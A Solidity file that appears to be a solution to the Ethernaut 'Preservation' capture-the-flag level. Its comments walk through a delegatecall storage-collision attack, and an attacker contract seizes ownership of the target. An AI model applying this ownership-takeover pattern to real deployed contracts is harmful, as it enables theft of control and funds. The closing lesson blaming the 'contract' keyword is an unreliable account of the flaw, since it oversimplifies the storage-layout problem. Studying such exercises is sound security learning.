/*
    Kind of easy level if you have done that 'delegates' thing in bonus part..Otherwise it might be difficult to understand but tbh, a lot of stuff to learn

    Moreover, don't fell in the trap of solving this whole level with the help of remix (I wasted a lot of time in that and felt like my answer is fucking wrong). But that's the part of learning the ways to cross a journey, and most important thing is to learn from other people's mistakes!!

    Well, let's begin

    1. I will really recommend getting your hands on that bonuses
    2. Now, as this level uses `delegate calls` thing, we need to remember that delegates calls used to preserve context (Not gonna explain in detail, that's why bonus is recommended)
    3. Thus, we gonna create our own Hack contract, which have the same order of state variables like in Preservation contract
    4. First check the variables in the console, like the owner, timeZone1Library and stuff like that..
    5. then call this -> contract.setFirstTime('[Your Hack contract address]'), this makes timeZone1Library align with our hack contract
    6. then call -> contract.setFirstTime(1)
    7. and we got the ownership (if you really didn't understand what happens, this means you haven't got your hands dirty with the bonus part)

    what was the fault?

    Never uses libraries with the keyword 'contract', always use the 'library' keyword in that case
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Preservation{}

contract Hack{
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    Preservation public target;

    constructor(address _victim){
        target = Preservation(_victim);
    }

    function setTime(uint) external{
        owner = msg.sender;
    }
}